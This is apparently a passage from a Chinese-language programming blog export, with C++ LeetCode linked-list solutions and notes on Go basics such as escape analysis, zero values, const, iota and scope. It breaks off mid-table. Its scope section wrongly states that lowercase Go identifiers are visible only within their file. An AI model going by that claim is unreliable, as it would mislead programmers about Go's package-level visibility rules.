slow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="getkthfromend-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="function">ListNode* <span class="title">getKthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 遇到倒数第一个节点时终止入栈，出栈时返回倒数第一个节点</span></span><br><span class="line">    <span class="keyword">if</span> (!head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="comment">// 从第二个节点开始入栈，出栈节点从倒数第一个节点开始</span></span><br><span class="line">    ListNode *node = <span class="built_in">getKthFromEnd</span>(head-&gt;next, k);</span><br><span class="line">    i++;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; k)</span><br><span class="line">        <span class="comment">// 出栈到倒数第k个节点前，返回入栈节点</span></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="comment">// 出栈到倒数第k个节点后（含），返回出栈节点</span></span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p><a href="https://leetcode.cn/problems/remove-nth-node-from-end-of-list/">leetcode 19: 删除链表的倒数第 N 个结点 （中等）</a></p>
<div class="tabs" id="removekthfromend"><ul class="nav-tabs"><li class="tab active"><a href="#removekthfromend-1">DoublePoint</a></li><li class="tab"><a href="#removekthfromend-2">Recursion</a></li></ul><div class="tab-content"><div class="tab-pane active" id="removekthfromend-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">removeKthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode *fast = head;</span><br><span class="line">    ListNode *slow = head;</span><br><span class="line">    <span class="comment">// 快指针先跑k次</span></span><br><span class="line">    <span class="keyword">while</span> (fast &amp;&amp; k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        fast = fast-&gt;next;</span><br><span class="line">        k--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 快指针跑到结尾，说明头节点即为倒数第k个节点</span></span><br><span class="line">    <span class="keyword">if</span> (!fast)</span><br><span class="line">        <span class="keyword">return</span> head-&gt;next;</span><br><span class="line">    <span class="comment">// 快慢指针同步跑到倒数第一个节点</span></span><br><span class="line">    <span class="keyword">while</span> (fast-&gt;next) &#123;</span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        fast = fast-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 慢指针指向倒数第k+1个节点，方便删除第k个节点</span></span><br><span class="line">    slow-&gt;next = slow-&gt;next-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="removekthfromend-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="function">ListNode* <span class="title">removeKthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 遇到NULL节点时终止入栈，出栈时返回NULL节点</span></span><br><span class="line">    <span class="keyword">if</span> (!head)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 从第二个节点开始入栈，出栈节点从倒数第零个节点（即NULL节点）开始，且在出栈后立即重建节点关系</span></span><br><span class="line">    head-&gt;next = <span class="built_in">removeKthFromEnd</span>(head-&gt;next, k);</span><br><span class="line">    i++;</span><br><span class="line">    <span class="keyword">if</span> (i == k)</span><br><span class="line">        <span class="comment">// 出栈到倒数第k个节点时，返回入栈节点的下一个节点以忽略它</span></span><br><span class="line">        <span class="keyword">return</span> head-&gt;next;</span><br><span class="line">    <span class="comment">// 其余情况，返回入栈节点</span></span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h1><p><a href="https://leetcode.cn/problems/reverse-linked-list/">leetcode 206. 反转链表（简单）</a></p>
<div class="tabs" id="reverselist"><ul class="nav-tabs"><li class="tab active"><a href="#reverselist-1">Iteration</a></li><li class="tab"><a href="#reverselist-2">Recursion</a></li></ul><div class="tab-content"><div class="tab-pane active" id="reverselist-1"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    ListNode* prev = <span class="literal">nullptr</span>;</span><br><span class="line">    ListNode* curr = head;</span><br><span class="line">    <span class="keyword">while</span> (curr) &#123;</span><br><span class="line">        <span class="comment">// 先存储后一个节点</span></span><br><span class="line">        ListNode* next = curr-&gt;next;</span><br><span class="line">        <span class="comment">// 更新当前节点的下一个节点为前一个节点</span></span><br><span class="line">        curr-&gt;next = prev;</span><br><span class="line">        <span class="comment">// 更新前一个节点为当前节点</span></span><br><span class="line">        prev = curr;</span><br><span class="line">        <span class="comment">// 更新当前节点为下一个节点</span></span><br><span class="line">        curr = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="reverselist-2"><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 遇到倒数第一个节点时终止入栈，出栈时返回倒数第一个节点</span></span><br><span class="line">    <span class="keyword">if</span> (!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="comment">// 从第二个节点开始入栈，出栈节点从倒数第一个节点开始</span></span><br><span class="line">    ListNode* newHead = <span class="built_in">reverseList</span>(head-&gt;next);</span><br><span class="line">    <span class="comment">// 从倒数第一个节点到第二个节点，依次更新当前节点的下一个节点为前一个节点</span></span><br><span class="line">    head-&gt;next-&gt;next = head;</span><br><span class="line">    <span class="comment">// 将前一个节点的下一个节点置为空（为了将旧头节点更新为新尾节点）</span></span><br><span class="line">    head-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> newHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="旋转链表"><a href="#旋转链表" class="headerlink" title="旋转链表"></a>旋转链表</h1><p><a href="https://leetcode.cn/problems/rotate-list/">leetcode 61. 旋转链表</a></p>
<ul>
<li>等同于将链表每个节点向右移动 k 个位置</li>
</ul>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>DataStructure</category>
        <category>LinkedList</category>
      </categories>
      <tags>
        <tag>SinglyLinkedList</tag>
      </tags>
  </entry>
  <entry>
    <title>Go语言基础</title>
    <url>/ProgrammingLanguage/Go/Basic.html</url>
    <content><![CDATA[<p>Go 基础语法梳理。</p>
<span id="more"></span>

<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><ul>
<li>为系统编程（systems programming）而设计</li>
<li>支持强类型（strongly typed）</li>
<li>支持垃圾回收（garbage-collected）</li>
<li>支持并发编程（concurrent programming）</li>
<li>通过包（package）管理依赖关系</li>
</ul>
<h2 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h2><ul>
<li>内存：<ul>
<li>栈（stack）：函数执行结束时自动回收（PUSH与POP指令），开销低，效率高</li>
<li>堆（heap）：函数结束后某个时间点进行垃圾回收（GC），使用标记清除算法<ul>
<li>标记（Mark）：从根对象出发查找并标记堆中所有存活的对象，需要暂停程序（STW, stop the world）</li>
<li>清除（Sweep）：遍历堆中的全部对象，回收未被标记的垃圾对象并将回收的内存加入空闲链表</li>
</ul>
</li>
</ul>
</li>
<li>逃逸分析(escape analysis)：编译器决定内存分配位置是在stack还是heap上，作用于编译阶段<ul>
<li><strong>指针逃逸</strong>：在函数中创建一个对象，返回其指针。函数退出后，因为指针的存在，对象内存不能回收，只能分配到heap上</li>
<li><strong>动态类型逃逸</strong>：函数参数为 interface{} 时，因为其可表示任意类型，编译期间很难确定其参数的具体类型，会逃逸到heap上</li>
<li><strong>栈空间不足</strong>：操作系统对内核线程使用的栈空间是有大小限制的，64 位系统上通常是 8 MB。Go 运行时(runtime) 为 goroutine 分配的初始栈大小为 2 KB，随后动态调整栈空间。当 goroutine 被调度时，会绑定到内核线程执行，栈空间大小不会超过操作系统的限制。对 Go 编译器而言，超过一定大小（与Go版本相关）的局部变量将逃逸到heap上</li>
<li><strong>闭包（closure）</strong>：将一个函数和对其周围状态（词法环境）的引用捆绑在一起的组合。在外部函数返回后，被闭包捕获的外部变量仍需要存活着，因此逃逸到heap上</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-garbage-collect"><ul class="nav-tabs"><li class="tab active"><a href="#go-garbage-collect-1">TypeEscape</a></li><li class="tab"><a href="#go-garbage-collect-2">Closure</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-garbage-collect-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newPerson</span><span class="params">(name <span class="type">string</span>)</span></span> *Person &#123;</span><br><span class="line">    p := <span class="built_in">new</span>(Person)</span><br><span class="line">    p.name = name</span><br><span class="line">    <span class="keyword">return</span> p <span class="comment">// pointer作为返回值，导致局部变量 p 逃逸到堆上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printPerson</span><span class="params">(p *Person)</span></span> &#123;</span><br><span class="line">    fmt.Println(p.name) <span class="comment">// 函数参数为 interface&#123;&#125; 时，编译期难确定具体类型，会逃逸到堆上</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    john := newPerson(<span class="string">&quot;John&quot;</span>)</span><br><span class="line">    printPerson(john)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$ go build -gcflags=-m ./main/c</span></span><br><span class="line"><span class="comment"># example.com/main/c</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">main/c/main.go:9:16: leaking param: name</span></span><br><span class="line"><span class="comment">main/c/main.go:10:10: new(Person) escapes to heap</span></span><br><span class="line"><span class="comment">main/c/main.go:15:18: leaking param content: p</span></span><br><span class="line"><span class="comment">main/c/main.go:16:13: ... argument does not escape</span></span><br><span class="line"><span class="comment">main/c/main.go:16:15: p.name escapes to heap</span></span><br><span class="line"><span class="comment">main/c/main.go:20:19: new(Person) does not escape</span></span><br><span class="line"><span class="comment">main/c/main.go:21:13: ... argument does not escape</span></span><br><span class="line"><span class="comment">main/c/main.go:21:13: p.name escapes to heap</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-garbage-collect-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Increase</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    n := <span class="number">0</span> <span class="comment">// n 会一直存在，直到 in 被销毁（逃逸到heap）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        n++</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    in := Increase()</span><br><span class="line">    fmt.Println(in()) <span class="comment">// 1</span></span><br><span class="line">    fmt.Println(in()) <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$ go build -gcflags=-m ./main/d</span></span><br><span class="line"><span class="comment"># example.com/main/d</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">main/d/main.go:6:2: moved to heap: n</span></span><br><span class="line"><span class="comment">main/d/main.go:7:9: func literal escapes to heap</span></span><br><span class="line"><span class="comment">main/d/main.go:14:16: func literal does not escape</span></span><br><span class="line"><span class="comment">main/d/main.go:15:13: ... argument does not escape</span></span><br><span class="line"><span class="comment">main/d/main.go:15:16: ~R0 escapes to heap</span></span><br><span class="line"><span class="comment">main/d/main.go:16:13: ... argument does not escape</span></span><br><span class="line"><span class="comment">main/d/main.go:16:16: ~R0 escapes to heap</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="风格（idiom）"><a href="#风格（idiom）" class="headerlink" title="风格（idiom）"></a>风格（idiom）</h1><ul>
<li>gofmt 对 package（不是 file）代码进行格式化<ul>
<li>制表符（tab）用于缩进（indentation）</li>
<li>没有行长度限制，必要时换行后用 tab 控制缩进</li>
<li>语法上很少需要小括号（parentheses），更简洁</li>
<li>注释支持<code>C-style /* */</code>和<code>C++-style //</code></li>
<li>命名约定（naming conventions）<ul>
<li>包名（package name）：作为内容的访问器（accessor），通常是 lower case, single-word<ul>
<li>包名也是源目录的名称，例如调用 src&#x2F;encoding&#x2F;base64.go 的代码为<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">base64.xxx()</span><br></pre></td></tr></table></figure></li>
<li>避免使用<code>import .</code></li>
</ul>
</li>
<li>多个单词：使用<code>MixedCaps</code>或<code>mixedCaps</code>，而非<code>mixed_caps</code></li>
<li>getter 和 setter<ul>
<li>对于 owner 字段，其 getter 命名应为<code>Owner()</code>，setter 命名为<code>SetOwner()</code></li>
</ul>
</li>
<li>one-method 接口通常加<code>-er</code>后缀：<code>Reader, Writer, Formatter, CloseNotifier</code></li>
</ul>
</li>
<li>词法分析器（lexer）会自动为语句添加分号（c-like, semicolon）作为结束标记<ul>
<li>如果换行符（newline）出现在可以结束语句的标记（token）之后，就插入一个 semicolon</li>
<li>禁止将控制结构（<code>if, for, switch or select</code>）的起始大括号（opening brace）放到新行<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> i &lt; f() <span class="comment">// wrong! will insert a semicolon!</span></span><br><span class="line">&#123; <span class="comment">// wrong!</span></span><br><span class="line">    g()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="数据（data）"><a href="#数据（data）" class="headerlink" title="数据（data）"></a>数据（data）</h1><ul>
<li>默认值为 zero-value：<ul>
<li>boolean：<code>false</code></li>
<li>numeric: <code>0</code></li>
<li>string: <code>&quot;&quot;</code></li>
<li>pointer, function, interface, slice, channel, map: <code>nil</code></li>
</ul>
</li>
<li>两个 allocation 函数：<code>new</code>和<code>make</code><ul>
<li><code>new(T)</code>分配 zero 存储空间然后返回它的地址（pointer, <code>*T</code>），即 new 不会初始化内存<ul>
<li>返回 local 变量的地址是合法的，局部变量的内存在函数返回后依然存在</li>
</ul>
</li>
<li><code>make(T, args)</code>返回 T 类型相关的初始化内存后的值（not pointer, <code>*T</code>）<ul>
<li>make 通常只用于 slice、map 和 channel，这三个类型也是必须初始化内存才有意义的</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-data"><ul class="nav-tabs"><li class="tab active"><a href="#go-data-1">DefaultValue</a></li><li class="tab"><a href="#go-data-2">new & make</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-data-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    b <span class="type">bool</span></span><br><span class="line">    i <span class="type">int</span></span><br><span class="line">    f <span class="type">float64</span></span><br><span class="line">    s <span class="type">string</span></span><br><span class="line">    a [<span class="number">3</span>]<span class="type">int</span></span><br><span class="line">    c []<span class="type">float32</span></span><br><span class="line">    t <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">    p *T</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    t := <span class="built_in">new</span>(T)</span><br><span class="line">    fmt.Println(t.b) <span class="comment">// false</span></span><br><span class="line">    fmt.Println(t.i) <span class="comment">// 0</span></span><br><span class="line">    fmt.Println(t.f) <span class="comment">// 0.0</span></span><br><span class="line">    fmt.Println(t.s) <span class="comment">// &quot;&quot;</span></span><br><span class="line">    fmt.Println(t.a) <span class="comment">// [0 0 0]</span></span><br><span class="line">    fmt.Println(t.c) <span class="comment">// []</span></span><br><span class="line">    fmt.Println(t.t) <span class="comment">// &#123;&#125;</span></span><br><span class="line">    fmt.Println(t.p) <span class="comment">// nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-data-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> p *[]<span class="type">int</span> = <span class="built_in">new</span>([]<span class="type">int</span>)       <span class="comment">// allocates slice structure; *p == nil; rarely useful</span></span><br><span class="line"><span class="keyword">var</span> v  []<span class="type">int</span> = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">100</span>) <span class="comment">// the slice v now refers to a new array of 100 ints</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><ul>
<li>常量（constant）使用<code>const</code>关键字定义<ul>
<li>支持表达式方式，在编译时求值。例如<code>const A = 1&lt;&lt;3</code></li>
</ul>
</li>
<li>枚举（enumerate）常量通过<code>iota</code>定义，其初始值为 0</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ByteSize <span class="type">float64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    _           = <span class="literal">iota</span> <span class="comment">// ignore</span></span><br><span class="line">    KB ByteSize = <span class="number">1</span> &lt;&lt; (<span class="number">10</span> * <span class="literal">iota</span>)</span><br><span class="line">    MB</span><br><span class="line">    GB</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b ByteSize)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> b &gt;= GB:</span><br><span class="line">        <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%.2fGB&quot;</span>, b/GB)</span><br><span class="line">    <span class="keyword">case</span> b &gt;= MB:</span><br><span class="line">        <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%.2fMB&quot;</span>, b/MB)</span><br><span class="line">    <span class="keyword">case</span> b &gt;= KB:</span><br><span class="line">        <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%.2fKB&quot;</span>, b/KB)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;%.2fB&quot;</span>, b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    bs := ByteSize(<span class="number">10000000000</span>)</span><br><span class="line">    fmt.Println(KB, MB, GB, bs.String())  <span class="comment">// 1.00KB 1.00MB 1.00GB 9.31GB</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> (</span><br><span class="line">        a = <span class="literal">iota</span></span><br><span class="line">        b</span><br><span class="line">        c</span><br><span class="line">        d = <span class="string">&quot;A&quot;</span></span><br><span class="line">        e</span><br><span class="line">        f = <span class="literal">iota</span></span><br><span class="line">        g</span><br><span class="line">    )</span><br><span class="line">    fmt.Println(a, b, c, d, e, f, g) <span class="comment">// 0 1 2 A A 5 6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="variable"><a href="#variable" class="headerlink" title="variable"></a>variable</h2><ul>
<li>变量（variable）使用<code>var</code>关键字定义<ul>
<li>支持表达式方式，在运行时求值</li>
</ul>
</li>
<li>变量的静态类型（static type）是在声明时确定的<ul>
<li>当静态类型为 interface 时，变量在运行时还会有动态类型（dynamic type），动态类型由赋值给接口的值的类型来决定</li>
</ul>
</li>
</ul>
<div class="tabs" id="go-var"><ul class="nav-tabs"><li class="tab active"><a href="#go-var-1">DynamicType</a></li><li class="tab"><a href="#go-var-2">Environ</a></li><li class="tab"><a href="#go-var-3">InitOrder</a></li></ul><div class="tab-content"><div class="tab-pane active" id="go-var-1"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> x <span class="keyword">interface</span>&#123;&#125; <span class="comment">// Variable declarations</span></span><br><span class="line">    a := <span class="number">1</span>            <span class="comment">// Short variable declarations</span></span><br><span class="line">    <span class="keyword">var</span> b *<span class="type">int</span> = &amp;a</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%v %T\n&quot;</span>, x, x) <span class="comment">// 0 int</span></span><br><span class="line">    x = a</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%v %T\n&quot;</span>, x, x) <span class="comment">// 1 int</span></span><br><span class="line">    x = b</span><br><span class="line">    fmt.Printf(<span class="string">&quot;%v %T\n&quot;</span>, x, x) <span class="comment">// 0xc00001c150 *int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-var-2"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    home   = os.Getenv(<span class="string">&quot;HOME&quot;</span>)</span><br><span class="line">    user   = os.Getenv(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line">    gopath = os.Getenv(<span class="string">&quot;GOPATH&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(home)   <span class="comment">// /root</span></span><br><span class="line">    fmt.Println(user)   <span class="comment">// root</span></span><br><span class="line">    fmt.Println(gopath) <span class="comment">// /opt/go/app</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="go-var-3"><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    a = c + b <span class="comment">// 9</span></span><br><span class="line">    b = f()   <span class="comment">// 4</span></span><br><span class="line">    c = f()   <span class="comment">// 5</span></span><br><span class="line">    d = <span class="number">3</span>     <span class="comment">// 5 (initialization has finished)</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    d++</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">g</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(a, b, c, d) <span class="comment">// 9 4 5 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> i, j = g()</span><br><span class="line">    <span class="keyword">var</span> _, k = g()</span><br><span class="line">    fmt.Println(i, j, k) <span class="comment">// 1 2 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="作用域（scope）"><a href="#作用域（scope）" class="headerlink" title="作用域（scope）"></a>作用域（scope）</h1><ul>
<li>包级别作用域（Package-level scope）：指变量、常量和函数在整个包内都可以访问<ul>
<li>名称必须以大写字母开头，表示它们是可导出的（exported），可以在其他包中使用</li>
</ul>
</li>
<li>文件级别作用域（File-level scope）：指变量、常量和函数在当前文件内都可以访问<ul>
<li>名称必须以小写字母开头，表示它们是私有的（unexported），只能在当前文件内使用</li>
</ul>
</li>
<li>块级别作用域（Block-level scope）：指变量在当前代码块（包括函数、循环、判断等）内部可访问<ul>
<li>名称必须以小写字母开头</li>
</ul>
</li>
<li>函数参数作用域（Function parameter scope）：指函数参数在函数内部可访问<ul>
<li>名称必须以小写字母开头</li>
</ul>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Package-level scope: X, Foo</span></span><br><span class="line"><span class="keyword">var</span> X <span class="type">int</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Foo</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Foo&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// File-level scope: y, bar</span></span><br><span class="line"><span class="keyword">var</span> y <span class="type">int</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bar</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;bar&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Block-level scope: i</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">1</span>; i++ &#123;</span><br><span class="line">        <span class="comment">// Function parameter scope: j</span></span><br><span class="line">        <span class="function"><span class="keyword">func</span><span class="params">(j <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">            fmt.Println(X) <span class="comment">// 1</span></span><br><span class="line">            Foo()          <span class="comment">// Foo</span></span><br><span class="line"></span><br><span class="line">            fmt.Println(y) <span class="comment">// 2</span></span><br><span class="line">            bar()          <span class="comment">// bar</span></span><br><span class="line"></span><br><span class="line">            fmt.Println(j) <span class="comment">// 0</span></span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="类型（type）"><a href="#类型（type）" class="headerlink" title="类型（type）"></a>类型（type）</h1><ul>
<li>两个类型相同（identical）的条件：<ul>
<li>数组（array）的元素类型（type)相同且数组长度（length）相同</li>
<li>切片（slice）的元素类型（type)相同</li>
<li>结构（struct）的各个 field 有相同的 type、name、tag，且 field 的序列顺序也是相同的</li>
<li>指针（pointer）的基本类型是相同的</li>
<li>函数（function）的参数（parameters）和返回值（result values）是相同的</li>
<li>接口（interface）的类型集（type set）是相同的</li>
<li>映射（map）的 key 和元素类型是相同的</li>
<li>通道（channel）的 direction 和元素类型是相同的</li>
</ul>
</li>
</ul>
<h2 id="种类"><a href="#种类" class="headerlink" title="种类"></a>种类</h2><h3 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean"></a>Boolean</h3><ul>
<li><code>bool</code>: <code>false</code>, <code>true</code></li>
</ul>
<h3 id="Numeric"><a href="#Numeric" class="headerlink" title="Numeric"></a>Numeric</h3><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>uint8 | byte</code></td>
<td align="left">8-bit unsigned integer (0 to 255)</td>
</tr>
<tr>
<td align="left"><code>uint16</code></td>
<td align="left">16-bit unsigned integer (0 to 65535)</td>
</tr>
<tr>
<td align="left"><code>uint32</code></td>
